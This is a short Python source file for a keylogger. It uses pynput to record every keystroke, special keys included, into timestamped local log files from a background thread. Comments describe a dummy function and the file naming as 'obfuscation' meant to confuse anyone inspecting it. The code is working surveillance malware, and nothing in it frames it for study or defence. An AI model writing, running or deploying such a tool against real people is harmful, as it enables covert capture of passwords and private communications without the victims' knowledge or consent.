import logging
from pynput.keyboard import Key, Listener
import os
import time
import threading

# Create a directory for logs (if it doesn't exist)
if not os.path.exists("keylogs"):
    os.makedirs("keylogs")

# Obfuscated filename and log file path
log_file = os.path.join("keylogs", f"keylog_{int(time.time())}.txt")

# Set up logging to capture keystrokes
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

# A dummy function to add some confusion (this can be removed in a real case)
def some_random_function():
    pass

# Function to capture each key press event
def on_press(key):
    try:
        # Log the regular key
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        # Handle special keys (e.g., Enter, Shift)
        logging.info(f"Special key {key} pressed")

# Function to stop the listener if 'esc' is pressed
def on_release(key):
    if key == Key.esc:
        logging.info("Escape key pressed. Exiting...")
        return False  # Stop the listener

# Function to start the keylogger in a separate thread
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Run the keylogger in a separate thread (so it doesn't block other tasks)
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

# Main loop (just to demonstrate background operation)
while True:
    some_random_function()  # This adds to obfuscation
    time.sleep(10)  # Simulate other background operations
